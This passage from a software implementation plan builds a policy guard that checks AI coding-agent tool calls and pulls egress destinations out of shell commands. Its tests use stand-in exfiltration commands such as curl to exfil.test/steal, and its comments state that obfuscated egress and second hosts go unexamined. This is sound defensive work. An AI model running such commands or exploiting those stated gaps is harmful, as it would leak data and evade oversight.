     * tools with no shell command would turn every one of those calls into a
     * total deny wearing a runtime-error reason. An empty string resolves, and
     * the annotator answers no destination for it, which is the behaviour that
     * was wanted.
     */
    raw_command: string;
  };
  input: { ifc: { source_labels: string[] } };
};
```

And the assembler:

```ts
export function assemblePreToolCallSnapshot(
  envelope: ToolCallRequestEnvelope,
  sourceLabels: IfcLabels,
  policyTargetArgument: string | undefined,
): AgtPreToolCallSnapshot {
  const { payload, request_id } = envelope.params;

  if (policyTargetArgument === undefined) {
    throw new Error(
      `mapping.yaml declares no policy_target_argument for the request gate, so there is no argument to ` +
        `copy to the "${POLICY_TARGET_LEAF}" leaf policy/manifest.yaml targets`,
    );
  }

  // Unwrap every argument. AGT reads raw values -- args.command has to be a
  // plain string for the stock pattern check's is_string guard, for instance --
  // so the ACS {value, provenance} wrapper does not survive into the snapshot.
  const args: Record<string, unknown> = {};
  for (const [key, wrapper] of Object.entries(payload.arguments)) {
    args[key] = wrapper.value;
  }

  // Loudly, never silently. A tool genuinely sending an argument by this name
  // would have its own value replaced by the policy target and never
  // evaluated -- so the collision is reported here, where a manifest or
  // hookmap author can still act on it.
  if (Object.hasOwn(args, POLICY_TARGET_LEAF)) {
    throw new Error(
      `tool ${JSON.stringify(payload.tool.name)} sent an argument named ${JSON.stringify(POLICY_TARGET_LEAF)}, ` +
        `which is the leaf this Guardian writes its policy target to -- one of the two would have to be ` +
        `overwritten, and neither may be`,
    );
  }

  // A tool whose declared policy-target argument is not among its arguments is
  // a registration fault, not a policy decision. Throwing names the tool and
  // the argument; leaving the leaf undefined would reach AGT as
  // runtime_error:path_missing, which reads like a policy decision and says
  // nothing about which declaration is wrong.
  if (!Object.hasOwn(args, policyTargetArgument)) {
    throw new Error(
      `mapping.yaml reads tool ${JSON.stringify(payload.tool.name)}'s policy target from argument ` +
        `${JSON.stringify(policyTargetArgument)}, but this call sent no such argument ` +
        `(it sent: ${Object.keys(args).join(", ") || "none"})`,
    );
  }
  args[POLICY_TARGET_LEAF] = args[policyTargetArgument];

  return {
    // budgets.rego fails closed on a present-but-wrong-typed counter, so these
    // are always real zeros, never undefined/null.
    envelope: { budgets: zeroedBudgets() },
    tool_call: {
      name: payload.tool.name,
      args,
      id: request_id,
      raw_command: payload.raw_command ?? "",
    },
    input: ifcMember(sourceLabels),
  };
}
```

Export `POLICY_TARGET_LEAF` from `packages/guardian/src/index.ts` alongside the assemblers, and add `resolvePolicyTargetArgument` to that file's `./map-verdict.ts` export block — the conformance package imports from `"guardian"`.

- [ ] **Step 7: Point the manifest at the leaf, and register the second tool shape**

In `policy/manifest.yaml`, replace `pre_tool_call`'s `policy_target` and the comment above it:

```yaml
intervention_points:
  pre_tool_call:
    # ONE target for every tool, which is all AGT's manifest schema allows:
    # intervention_point is additionalProperties: false with exactly one
    # policy_target, and AGT resolves it before any rule runs. So this target
    # is NOT any host's argument -- it is the normalised leaf the Guardian
    # writes, and mapping.yaml's policy_target_argument table is what says
    # which of each tool's own arguments was copied into it.
    #
    # Measured, and the reason this is no longer "$.tool_call.args.command": a
    # benign WebFetch call under that target is DENIED on
    # runtime_error:path_missing, with no rule consulted. One literal argument
    # name can only serve a deployment that governs one tool shape.
    #
    # test/path-dialects.test.ts checks the two agreements this leaf sits
    # between: that this path names the leaf assemble-snapshot.ts writes, and
    # that every argument mapping.yaml's by_tool table names is keyed by a tool
    # this file's own tools: registry knows.
    policy_target: "$.tool_call.args.acs_policy_target"
    policy_target_kind: tool_args
    tool_name_from: "$.tool_call.name"
    policy:
      id: agt_stock
```

Add the two fetch tools to `tools:`, leaving the existing three entries and their comments exactly as they are:

```yaml
  # Claude Code's own real tool name for a web fetch, and OpenCode's, for the
  # identical reason "Bash" and "bash" are both here: an unregistered
  # tool_call.name fails AGT's evaluation closed on runtime_error:tool_unknown
  # before any rule runs. Both spellings are registered because one manifest
  # serves both hosts -- so this registry deliberately names more tools than
  # either host dispatches.
  #
  # security_labels: [shell] is carried for the same reason every other entry
  # carries it, and it matters more now than it did: with cfg.egress configured
  # but its `allowlist` key absent, AGT's allowlist(rules) falls back to
  # input.tool.security_labels and denies every destination. policy/lib/
  # data.json ships an explicit allowlist so that fallback is never reached.
  WebFetch:
    type: Tool
    id: WebFetch
    security_labels: [shell]
  webfetch:
    type: Tool
    id: webfetch
    security_labels: [shell]
```

- [ ] **Step 8: Resolve the argument before assembling, in `evaluateStep`**

In `packages/guardian/src/server.ts`, import `resolvePolicyTargetArgument` from `./map-verdict.ts` alongside `mapVerdict`, widen the assembler parameter's type, and reorder the body. The point must now be resolved **before** the snapshot is assembled, where it used to be resolved after:

```ts
async function evaluateStep<E extends SteppedEnvelope>(
  raw: unknown,
  envelope: E,
  assemble: (envelope: E, sourceLabels: IfcLabels, policyTargetArgument: string | undefined) => GuardianSnapshot,
  bridge: PolicyBridge<GuardianSnapshot>,
  mapping: Mapping,
  sessionContextStore: SessionContextStore,
): Promise<JsonRpcSuccess | JsonRpcFailure> {
  try {
    appendContextEntry(sessionContextStore, envelope.params.metadata.session_id, {
      method: envelope.method,
      request_id: envelope.params.request_id,
      tool_name: envelope.params.payload.tool.name,
    });

    // Resolved BEFORE the snapshot is assembled, where it used to be resolved
    // after: the assembler needs to know which of this tool's arguments the
    // policy target is read from, and mapVerdict needs the same answer to key
    // any override it has to write back. One resolution, two readers -- asking
    // twice would let them differ.
    const point = resolveInterventionPoint(envelope.method, mapping);
    const policyTargetArgument = resolvePolicyTargetArgument(mapping, point, envelope.params.payload.tool.name);

    const snapshot = assemble(
      envelope,
      supplySourceLabels(sessionContextStore, envelope.params.metadata.session_id),
      policyTargetArgument,
    );
    const verdict = await bridge.evaluate(point, snapshot);
    const decision = mapVerdict(verdict, mapping, point, policyTargetArgument);

    persistIfcLabels(sessionContextStore, envelope.params.metadata.session_id, verdict.result_labels);
    return successResponse(envelope.id, finalResult(envelope.params, decision));
  } catch (error) {
    // … unchanged …
  }
}
```

**Both call sites stay direct function references.** `assemblePostToolCallSnapshot` needs no change: a two-parameter function is assignable to a three-parameter function type, so the result gate ignores an argument it has no use for. Do **not** wrap either assembler in a lambda — that file's own comment explains why the direct reference is what makes the wrong-snapshot miswiring unrepresentable.

- [ ] **Step 9: Update the conformance harness's call**

`packages/conformance/src/verdicts.ts` measures the verdict table, not any one tool, so it asks the mapping what an unlisted tool gets. Import `resolvePolicyTargetArgument` from `"guardian"` alongside `mapVerdict`, add the constant near that file's other probe values, and replace the call at line 181:

```ts
/** A tool name `mapping.yaml`'s `by_tool` table deliberately does not carry,
 * so this round trip reads the declared default rather than one tool's row.
 * Passing a real tool name would make the measurement depend on which tools
 * happen to be registered. */
const CONFORMANCE_PROBE_TOOL = "conformance_probe";
```

```ts
    acs = mapVerdict(agt, mapping, point, resolvePolicyTargetArgument(mapping, point, CONFORMANCE_PROBE_TOOL));
```

- [ ] **Step 10: Split the path-dialects check**

`test/path-dialects.test.ts` derives `into_argument` from the manifest's `policy_target`. Under this task the manifest names the leaf, so that derivation would yield `acs_policy_target` — no host's argument — and fail against every row of the new table. It does not disappear; it splits into the agreements that are load-bearing now. `acsAddressOf` is unchanged and still throws for a shape it cannot express.

```ts
import { POLICY_TARGET_LEAF } from "../packages/guardian/src/assemble-snapshot.ts";

type MappingRule = { into: "parameter_overrides" } | { into: "redactions"; into_path: string };
type PolicyTargetArgument = { default: string; by_tool?: Record<string, string> };
type MappingPoint = {
  acs_method: string | null;
  policy_target_argument?: PolicyTargetArgument;
  modifications?: MappingRule;
};
type Mapping = { intervention_points: Record<string, MappingPoint> };
type Manifest = {
  intervention_points: Record<string, ManifestPoint>;
  tools: Record<string, unknown>;
};
```

```ts
describe("the AGT and ACS dialects address the same leaf", () => {
  const gated = Object.entries(mapping.intervention_points).filter(([, row]) => row.modifications !== undefined);

  it("covers every point mapping.yaml gives a modifications rule", () => {
    expect(gated.map(([point]) => point).sort()).toEqual(["post_tool_call", "pre_tool_call"]);
  });

  // AGREEMENT ONE. The request gate's manifest target no longer names a host
  // argument at all: it names the single normalised leaf the Guardian writes
  // every tool's policy target to, because AGT allows an intervention point
  // exactly one target and two tools disagree about their argument names. So
  // what is derived here is that the manifest and the assembler name the SAME
  // leaf -- one derivation, as before, of a different pair.
  it("pre_tool_call: the manifest targets the leaf the assembler writes", () => {
    const policyTarget = manifest.intervention_points.pre_tool_call?.policy_target;
    expect(policyTarget).toBeString();
    const derived = acsAddressOf(policyTarget as string);
    expect(derived.kind).toBe("argument");
    expect(derived.address).toBe(POLICY_TARGET_LEAF);
  });

  // AGREEMENT TWO, unchanged: the result gate rewrites a leaf of the result
  // payload, addressed by an ACS JSON pointer derived from the same JSONPath.
  it("post_tool_call: mapping.yaml's pointer is derivable from the manifest's policy_target", () => {
    const policyTarget = manifest.intervention_points.post_tool_call?.policy_target;
    expect(policyTarget).toBeString();
    const derived = acsAddressOf(policyTarget as string);
    const rule = mapping.intervention_points.post_tool_call?.modifications as { into: "redactions"; into_path: string };
    expect(derived.kind).toBe("pointer");
    expect(rule.into_path).toBe(derived.address);
  });

  // AGREEMENT THREE, and the honest half of it is stated in the test's own
  // name. The registry can say WebFetch is registered; it cannot say WebFetch
  // takes a `url`. Same limit the upstream watch measured for hookmap `tools`
  // entries, and for the same reason: one manifest serves both hosts, so it
  // names more tools than either dispatches.
  it("every tool the by_tool table keys is one the manifest registry knows -- existence only, not argument shape", () => {
    const registered = new Set(Object.keys(manifest.tools ?? {}));
    for (const [point, row] of Object.entries(mapping.intervention_points)) {
      for (const tool of Object.keys(row.policy_target_argument?.by_tool ?? {})) {
        expect({ point, tool, registered: registered.has(tool) }).toEqual({ point, tool, registered: true });
      }
    }
  });

  it("declares a default argument for every gate that rewrites one", () => {
    for (const [point, row] of gated) {
      if ((row.modifications as MappingRule).into !== "parameter_overrides") continue;
      expect({ point, declared: typeof row.policy_target_argument?.default }).toEqual({ point, declared: "string" });
    }
  });

  it("refuses a policy_target shape it cannot express, rather than passing by default", () => {
    expect(() => acsAddressOf("$.tool_call.name")).toThrow(/does not know how to express/);
  });
});
```

The old `"fails when the two files disagree, which is the whole point"` case goes: it compared a derived address against `into_argument`, and there is no `into_argument`. The drift it guarded is guarded now by the leaf-name assertion above, which fails the moment the manifest targets anything but the leaf the assembler writes.

- [ ] **Step 11: Run the tests to verify they pass**

Run: `bun test packages/guardian/test/map-verdict.test.ts packages/guardian/test/assemble-snapshot.test.ts packages/guardian/test/server.test.ts test/path-dialects.test.ts`
Expected: PASS.

Then the whole suite and the typechecker:

```bash
bun test
bun run typecheck
```

Existing `server.test.ts` cases evaluate through the real manifest and the real mapping, so they exercise the new leaf end to end without being rewritten. If one fails, read the failure before changing it: `runtime_error:path_missing` means the manifest and the assembler disagree about the leaf's name, and `runtime_error:tool_unknown` means a fixture uses a tool the registry does not carry.

Baseline for comparison: before this slice the suite was **929 pass, 1 skip, 0 fail** across 65 files.

- [ ] **Step 12: Commit**

```bash
git add mapping.yaml policy/manifest.yaml packages/guardian/src packages/conformance/src/verdicts.ts packages/guardian/test test/path-dialects.test.ts
git commit -m "Give two tool shapes one policy target, and one argument declaration read twice"
```

---

## Task 2: The destination extractor · slice #28 · N55

A pure function that reads AGT's preliminary policy input and answers `{destination}` when it finds one inside `raw_command`, `{}` when it does not. Nothing is wired to it yet — this task builds and pins the function alone, so its miss direction is a reviewed decision rather than something inferred from a passing demo.

**Files:**
- Create: `packages/guardian/src/annotate-egress.ts`
- Test: `packages/guardian/test/annotate-egress.test.ts`

**Interfaces:**
- Consumes: nothing from Task 1 at the type level. It reads AGT's preliminary document, whose `snapshot` member is the snapshot Task 1's assembler produced.
- Produces: `annotateEgressDestination(name: string, config: unknown, preliminary: unknown): unknown` — assignable to `agt-bridge`'s `Annotator`, which Task 4 depends on.

**Three measured facts this function is shaped by, none of them guessable from AGT's documentation:**

1. **The dispatcher is handed the whole preliminary document, not the value `from` names.** `config` is the annotator's own declaration — `{"from":"$.tool_call.raw_command","type":"classifier"}` — and `preliminary` is `{intervention_point, policy_target, snapshot, annotations, tool}`. So the command is read at `preliminary.snapshot.tool_call.raw_command`, by this function, itself.
2. **`egress.rego`'s `host_of()` splits on `://` and `/`.** Handed `curl https://evil.test/x` whole it answers `curl https` — a garbage host, not a destination. Extraction is a real step, and forwarding the raw command as a destination is not one.
3. **Two resolvable destination paths with different values are a runtime error.** Measured: a snapshot carrying `args.url: "https://docs.anthropic.com/a"` alongside an annotation destination of `https://exfil.test/b` came back `deny runtime_error:policy_invocation_failed` — `destination(rules)` is a complete Rego rule and has no single value to answer with. So this function stands down whenever the snapshot's own arguments already carry a destination AGT reads.

- [ ] **Step 1: Write the failing test**

```ts
// packages/guardian/test/annotate-egress.test.ts
import { describe, expect, it } from "bun:test";
import { annotateEgressDestination } from "../src/annotate-egress.ts";

/** AGT's preliminary policy input, cut down to the two members this function
 * reads. The real document also carries `intervention_point`, `policy_target`,
 * `annotations` and `tool`; none of them is consulted here. */
function preliminary(toolCall: Record<string, unknown>): unknown {
  return { intervention_point: "pre_tool_call", snapshot: { tool_call: toolCall }, annotations: {} };
}

describe("pulling an egress destination out of a shell command", () => {
  it("finds the destination a curl reaches for", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: { command: "curl https://exfil.test/steal" }, raw_command: "curl https://exfil.test/steal" }),
      ),
    ).toEqual({ destination: "https://exfil.test/steal" });
  });

  it("finds it mid-command, not only at the end", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "Bash", args: {}, raw_command: "curl -sS https://exfil.test/steal -o /tmp/x" }),
      ),
    ).toEqual({ destination: "https://exfil.test/steal" });
  });

  it("stops at the shell metacharacter, not at the end of the line", () => {
    expect(
      annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "curl https://exfil.test/x; ls" })),
    ).toEqual({ destination: "https://exfil.test/x" });
  });

  // The stated miss direction, asserted rather than left implicit: the stock
  // gate is `undefined` when no destination resolves, so the call falls
  // through to the other gates. A command this cannot parse is unexamined, not
  // denied.
  it("answers no destination for a command carrying none, rather than failing", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {}, raw_command: "echo hi" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries an empty raw command", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "WebFetch", args: { url: "x" }, raw_command: "" }))).toEqual({});
  });

  it("answers no destination when the snapshot carries no raw command at all", () => {
    expect(annotateEgressDestination("egress", {}, preliminary({ name: "Bash", args: {} }))).toEqual({});
  });
});

describe("standing down when the snapshot already carries a destination", () => {
  // Two of the stock gate's destination paths resolving to different strings
  // is not a priority order -- it is a complete-rule conflict, measured as
  // deny runtime_error:policy_invocation_failed. So an argument AGT already
  // reads wins, and this function contributes nothing.
  for (const argument of ["url", "endpoint", "host", "domain"]) {
    it(`contributes nothing when the tool sent its own "${argument}"`, () => {
      expect(
        annotateEgressDestination(
          "egress",
          {},
          preliminary({ name: "SomeTool", args: { [argument]: "https://docs.anthropic.com/a" }, raw_command: "curl https://exfil.test/b" }),
        ),
      ).toEqual({});
    });
  }

  it("still reads the raw command when the tool's own destination argument is not a string", () => {
    expect(
      annotateEgressDestination(
        "egress",
        {},
        preliminary({ name: "SomeTool", args: { url: null }, raw_command: "curl https://exfil.test/b" }),
      ),
    ).toEqual({ destination: "https://exfil.test/b" });
  });
});

describe("total, whatever it is handed", () => {
  // A throw here is not an error report: AGT turns any annotator failure into
  // its own runtime_error:annotation_failed deny, which lands on every call in
  // the deployment and reads like a policy decision.
  it("never throws and never answers null", () => {
    for (const input of [undefined, null, 42, "a string", {}, { snapshot: null }, { snapshot: { tool_call: 7 } }]) {
      expect(() => annotateEgressDestination("egress", {}, input)).not.toThrow();
      expect(annotateEgressDestination("egress", {}, input)).toEqual({});
    }
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test packages/guardian/test/annotate-egress.test.ts`
Expected: FAIL — `Cannot find module '../src/annotate-egress.ts'`.

- [ ] **Step 3: Write the implementation**

```ts
// packages/guardian/src/annotate-egress.ts
/**
 * The Guardian's destination extractor: what stands between an ACS
 * `raw_command` and AGT's stock egress gate.
 *
 * NOT the gate. `policy/lib/egress.rego` is the gate, `cfg.egress` is its
 * configuration, `egress_destination_not_allowed` is the reason it emits, and
 * every one of those is AGT's, vendored byte-identical and not authored here.
 * This module supplies one of that gate's own declared inputs -- its FIFTH
 * default destination path, `["annotations", "egress", "destination"]`, which
 * is to say AGT anticipated exactly this seam and published the address for
 * it.
 *
 * WHY EXTRACTION RATHER THAN FORWARDING. The gate's `host_of()` splits on
 * `://` and then on `/`, so handed `curl https://evil.test/x` whole it answers
 * `curl https`. Pointing a destination path at `raw_command` produces a
 * garbage host, not a destination.
 *
 * WHY IT READS THE PRELIMINARY DOCUMENT ITSELF. A manifest's
 * `annotations.<name>.from` is a liveness precondition, not a projection: the
 * SDK requires the path to resolve (an unresolvable one denies the whole call
 * on runtime_error:path_missing, before this function is called at all) and
 * then hands the dispatcher the entire preliminary policy input rather than
 * the value it resolved. Measured. So the command is read here, from the
 * snapshot, by name.
 */

/**
 * The tool-argument names AGT's own gate already reads a destination out of --
 * `default_destination_paths` in `policy/lib/egress.rego`, minus the
 * annotation path this module writes.
 *
 * When one of them is already a string on the snapshot, this module answers
 * nothing. `destination(rules)` is a COMPLETE Rego rule over every configured
 * path, so two paths resolving to different strings has no single answer:
 * measured, that is `deny runtime_error:policy_invocation_failed` -- a total
 * deny wearing a runtime-error reason, on a call nobody decided about. The
 * tool's own argument is the better evidence anyway: it is what the tool will
 * actually reach for, where a command line is what someone typed.
 */
const ARGUMENTS_AGT_ALREADY_READS = ["url", "endpoint", "host", "domain"] as const;

/**
 * The first absolute http(s) URL in a command line.
 *
 * Scheme-anchored on purpose. A bare-host pattern would match package names,
 * file paths and flag values, and every false positive here becomes a denial
 * of a step nobody meant to govern. The character class ends the match at
 * whitespace and at the shell metacharacters that end a word, so a trailing
 * `; ls` or `| tee` is not swallowed into the host.
 *
 * First match, not every match: the gate takes one destination. A command
 * reaching two hosts has its first examined and the rest unexamined, which is
 * this module's stated miss direction rather than a hidden one.
 */
const DESTINATION_IN_COMMAND = /\bhttps?:\/\/[^\s'"`;|&()<>]+/;

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

/**
 * Answers `{destination}` when it finds one, `{}` when it does not.
 *
 * Never a throw and never `null`, and both halves are load-bearing. AGT turns
 * any annotator failure -- thrown or rejected -- into its own
 * `runtime_error:annotation_failed` deny, which lands on EVERY call in the
 * deployment, benign ones included, and reads like a policy decision. And a
 * command with no destination is not a failure: the gate is `undefined` when
 * nothing resolves, and the call falls through to the other gates. So an
 * obfuscated or novel egress form is UNEXAMINED here, not denied -- the
 * failure direction the runbook states plainly, because the demo's shape
 * invites the opposite reading.
 *
 * `name` and `config` are part of the dispatcher contract and are not read:
 * this function is the one annotator this Guardian has, and routing by name is
 * its caller's job.
 */
export function annotateEgressDestination(_name: string, _config: unknown, preliminary: unknown): unknown {
  if (!isPlainObject(preliminary)) return {};
  const snapshot = preliminary.snapshot;
  if (!isPlainObject(snapshot)) return {};
  const toolCall = snapshot.tool_call;
  if (!isPlainObject(toolCall)) return {};

  const args = isPlainObject(toolCall.args) ? toolCall.args : {};
  for (const argument of ARGUMENTS_AGT_ALREADY_READS) {
    if (typeof args[argument] === "string") return {};
  }

  const rawCommand = toolCall.raw_command;
  if (typeof rawCommand !== "string") return {};

  const found = DESTINATION_IN_COMMAND.exec(rawCommand);
  return found === null ? {} : { destination: found[0] };
}
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `bun test packages/guardian/test/annotate-egress.test.ts`
Expected: PASS.

Then `bun test && bun run typecheck` — nothing imports this module yet, so the rest of the suite is unchanged.

- [ ] **Step 5: Commit**

```bash
git add packages/guardian/src/annotate-egress.ts packages/guardian/test/annotate-egress.test.ts
git commit -m "Pull a destination out of a shell command, or answer that there is none"
```

---

## Task 3: `raw_command` reaches the wire · slice #28 · N2, N11, N21, S1, S2

ACS v0.1.0's `raw_command` has been typed in this repository since V1 (`validate-envelope.ts:100`), declared by no hookmap and forwarded by no assembler. This task is what first populates it: one new hookmap key, read by the one `buildEnvelope` both hosts share.

**Files:**
- Modify: `packages/host-adapter/src/build-envelope.ts`
- Modify: `hosts/claude-code/claude-code.hookmap.yaml`
- Modify: `hosts/opencode/opencode.hookmap.yaml`
- Test: `packages/host-adapter/test/build-envelope.test.ts`

**Interfaces:**
- Consumes: nothing from Tasks 1–2.
- Produces: `HookmapRequestHookEntry.raw_command?: string`; `AcsToolCallRequestPayload.raw_command?: string`. The demo Task 5 wires up depends on both.

**The one asymmetry to get right, and the reason for it.** An unresolvable `outputs.from` **throws** — *"a result payload carrying no output would ask the far end to govern a step whose output it cannot see"*. An unresolvable `raw_command` must **not**: it is optional in `hooks/tool-call-request.json`, a request payload without one is complete and governable, and a `WebFetch` call resolves `$.tool_input.command` to nothing on every single invocation. Throwing there would send every fetch into `governStep`'s posture path and, under the shipped `proceed`, run it ungoverned.

- [ ] **Step 1: Write the failing test**

Append to `packages/host-adapter/test/build-envelope.test.ts`, following that file's existing hookmap-fixture style.

```ts
describe("the raw command a hookmap declares a path for", () => {
  const requestGate = (extra: Record<string, unknown> = {}) => ({
    host: "test-host",
    hooks: {
      PreToolUse: {
        acs_method: "steps/toolCallRequest",
        tool_name: "$.tool_name",
        arguments: "$.tool_input",
        raw_command: "$.tool_input.command",
        decisions: { allow: { output: { d: { value: "allow" } } }, deny: { output: { d: { value: "deny" } } } },
        ...extra,
      },
    },
  });

  it("carries it onto the request payload when the path resolves", () => {
    const envelope = buildEnvelope({
      hookmap: requestGate(),
      hookEventName: "PreToolUse",
      payload: { tool_name: "Bash", tool_input: { command: "curl https://exfil.test/x" } },
      sessionId: "s",
    });
    expect(envelope.params.payload.raw_command).toBe("curl https://exfil.test/x");
  });

  // Unlike outputs.from, whose unresolvable path throws: raw_command is
  // optional in the ACS request payload, and a tool with no shell command
  // resolves this path to nothing on every call. Throwing would send every one
  // of those steps into the delivery posture and, under the shipped `proceed`,
  // run it ungoverned.
  it("omits it when the path does not resolve, rather than failing the step", () => {
    const envelope = buildEnvelope({
      hookmap: requestGate(),
      hookEventName: "PreToolUse",
      payload: { tool_name: "WebFetch", tool_input: { url: "https://docs.anthropic.com/x" } },
      sessionId: "s",
    });
    expect(envelope.params.payload.raw_command).toBeUndefined();
    expect(envelope.params.payload.arguments.url).toEqual({ value: "https://docs.anthropic.com/x" });
  });

  it("omits it when the path resolves to something that is not a string", () => {
    const envelope = buildEnvelope({
      hookmap: requestGate(),
      hookEventName: "PreToolUse",
      payload: { tool_name: "Bash", tool_input: { command: { nested: true } } },
      sessionId: "s",
    });
    expect(envelope.params.payload.raw_command).toBeUndefined();
  });

  it("names the hook and the member when the declaration is not a path string", () => {
    expect(() =>
      buildEnvelope({
        hookmap: requestGate({ raw_command: { from: "$.tool_input.command" } }),
        hookEventName: "PreToolUse",
        payload: { tool_name: "Bash", tool_input: { command: "echo hi" } },
        sessionId: "s",
      }),
    ).toThrow(/PreToolUse.*raw_command/s);
  });

  it("refuses a result gate that declares one -- a result payload has no command", () => {
    expect(() =>
      buildEnvelope({
        hookmap: {
          host: "test-host",
          hooks: {
            PostToolUse: {
              acs_method: "steps/toolCallResult",
              tool_name: "$.tool_name",
              outputs: { from: "$.tool_response.stdout", within: "$.tool_response" },
              exit_status: { literal: "success" },
              raw_command: "$.tool_input.command",
              decisions: { allow: { output: { d: { value: "a" } } }, deny: { output: { d: { value: "d" } } } },
            },
          },
        },
        hookEventName: "PostToolUse",
        payload: { tool_name: "Bash", tool_input: { command: "echo hi" }, tool_response: { stdout: "hi" } },
        sessionId: "s",
      }),
    ).toThrow(/PostToolUse.*raw_command/s);
  });
});
```

⚠️ *Adapt the `buildEnvelope(...)` call shape to whatever that test file already uses — the four members above are the ones this behaviour needs, not necessarily the whole argument object.*

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test packages/host-adapter/test/build-envelope.test.ts`
Expected: FAIL — `raw_command` is `undefined` on the payload in the first case, and the two refusal cases do not throw.

- [ ] **Step 3: Implement it in `buildPayload`**

In `packages/host-adapter/src/build-envelope.ts`, add the member to both hook-entry types:

```ts
export type HookmapRequestHookEntry = HookmapHookEntryCommon & {
  /** JSONPath-lite (`$.foo.bar`) into the raw hook payload for the argument bag. */
  arguments: string;
  /**
   * JSONPath-lite into the raw hook payload for the command line this step is,
   * verbatim -- ACS's own `raw_command`, optional in
   * hooks/tool-call-request.json and optional here.
   *
   * Declared per host because the field it lives in is the host's: Claude Code
   * puts it at `$.tool_input.command`, OpenCode at `$.args.command`. A tool
   * that is not a shell command resolves it to nothing, and that is an
   * ordinary outcome, not a fault -- see buildPayload.
   */
  raw_command?: string;
  outputs?: never;
  exit_status?: never;
};

export type HookmapResultHookEntry = HookmapHookEntryCommon & {
  arguments?: never;
  /** A result payload carries no command. Spelled `never` beside the request
   * entry's own member, the same way `arguments` and `outputs` are, so the
   * broken entry is not a legal type. */
  raw_command?: never;
  outputs: HookmapOutputs;
  exit_status: HookmapLiteral | HookmapFieldRead;
};
```

And the payload type:

```ts
export type AcsToolCallRequestPayload = {
  tool: { name: string };
  arguments: Record<string, AcsArgument>;
  /** ACS's optional `raw_command`. Present only when the hookmap declared a
   * path for it AND that path resolved to a string. */
  raw_command?: string;
  exit_status?: never;
  outputs?: never;
};
```

In `buildPayload`'s `arguments` branch, after the existing argument unwrapping and before the return:

```ts
    const payloadOut: AcsToolCallRequestPayload = { tool: { name: toolName }, arguments: args };

    // `?? undefined` for the same reason its siblings use it: a bare
    // `raw_command:` line parses to null in YAML, which is a key present and
    // unusable rather than a key absent.
    const rawCommandPath = entry.raw_command ?? undefined;
    if (rawCommandPath !== undefined) {
      if (typeof rawCommandPath !== "string") {
        throw new Error(
          `buildEnvelope: hookmap entry for hook "${event}" declares "raw_command" as ` +
            `${JSON.stringify(rawCommandPath)} -- "raw_command" names the verbatim command line with a ` +
            `single JSONPath-lite string, the same notation as "arguments" beside it`,
        );
      }
      const rawCommand = resolvePath(payload, rawCommandPath);
      // Omitted, never a throw, and the asymmetry with outputs.from below is
      // deliberate. An unresolvable outputs.from throws because a result
      // payload with no output would ask the far end to govern a step whose
      // output it cannot see. raw_command is different in kind: it is optional
      // in hooks/tool-call-request.json, a request payload without one is
      // complete and fully governable, and a tool that is not a shell command
      // resolves this path to nothing on EVERY call. Throwing there would send
      // every one of those steps to governStep's posture path, which under the
      // shipped `proceed` runs the step ungoverned.
      if (typeof rawCommand === "string") {
        payloadOut.raw_command = rawCommand;
      }
    }

    return payloadOut;
```

And at the top of the `outputs` branch, beside the entry's other member checks:

```ts
    // A result gate declaring a command path is a hookmap fault, not a payload
    // one: the result payload this branch builds has no member for it, so the
    // declaration could only ever be silently dropped.
    if (entry.raw_command !== undefined && entry.raw_command !== null) {
      throw new Error(
        `buildEnvelope: hookmap entry for hook "${event}" declares "raw_command" beside "outputs" -- a ` +
          `result payload carries no command line, and this declaration could only be dropped`,
      );
    }
```

- [ ] **Step 4: Declare the path in both hookmaps**

`hosts/claude-code/claude-code.hookmap.yaml`, under `hooks.PreToolUse`, beside `arguments`:

```yaml
    # ACS's own raw_command: the command line this step IS, verbatim, which is
    # a different thing from the argument bag above and is why it gets its own
    # path rather than being read back out of `arguments`.
    #
    # What reads it: the Guardian's egress annotator, which extracts a
    # destination from it and answers at AGT's own fifth default destination
    # path. AGT's egress gate cannot use the command directly -- its host_of()
    # splits on "://" and then "/", so handed `curl https://evil.test/x` it
    # answers `curl https`.
    #
    # Unresolvable is ORDINARY here, not a fault: WebFetch sends no `command`,
    # and the field is optional in hooks/tool-call-request.json. buildEnvelope
    # omits it rather than throwing, which is the opposite of what it does for
    # the result gate's `outputs.from` -- see that function's own comment for
    # why the two differ.
    raw_command: $.tool_input.command
```

`hosts/opencode/opencode.hookmap.yaml`, under `hooks."tool.execute.before"`, beside `arguments`:

```yaml
    # The same declaration Claude Code's hookmap makes, at this host's own
    # field: OpenCode hands the plugin a mutable `{args}`, so the shell tool's
    # command line is `$.args.command` where host #1 has `$.tool_input.command`.
    # Absorbing that difference is what a hookmap is for.
    raw_command: $.args.command
```

- [ ] **Step 5: Run the tests to verify they pass**

Run: `bun test packages/host-adapter/test/build-envelope.test.ts`
Expected: PASS.

Then `bun test && bun run typecheck`. Both hosts' own wire-shape tests read the shipped hookmaps; if one pins the entry's exact key set, add `raw_command` there and say so in the commit.

- [ ] **Step 6: Commit**

```bash
git add packages/host-adapter/src/build-envelope.ts packages/host-adapter/test/build-envelope.test.ts hosts/claude-code/claude-code.hookmap.yaml hosts/opencode/opencode.hookmap.yaml
git commit -m "Carry the command line ACS has always typed and no hookmap declared"
```

---

## Task 4: The gate turned on, and a dispatcher that is never absent · slice #28 · N30, N31, S7, S8

`cfg.egress` is set — one `data.json` key, no code and no Rego — and the manifest declares the annotator that feeds its fifth destination path. The Guardian stops treating a dispatcher as optional.

**Files:**
- Modify: `policy/lib/data.json` (the only file in that directory this slice may touch)
- Modify: `policy/manifest.yaml`
- Modify: `policy/manifest.drift.yaml`
- Modify: `packages/guardian/src/server.ts`
- Test: `packages/guardian/test/server.test.ts`

**Interfaces:**
- Consumes: `annotateEgressDestination` (Task 2); the always-present `raw_command` on the snapshot (Task 1); the wire's `raw_command` (Task 3).
- Produces: `dispatchGuardianAnnotator: Annotator`, exported from `packages/guardian/src/server.ts` (not from the package barrel — the barrel is governance verbs only).

**Two measured hazards, and this task is where both become reachable:**

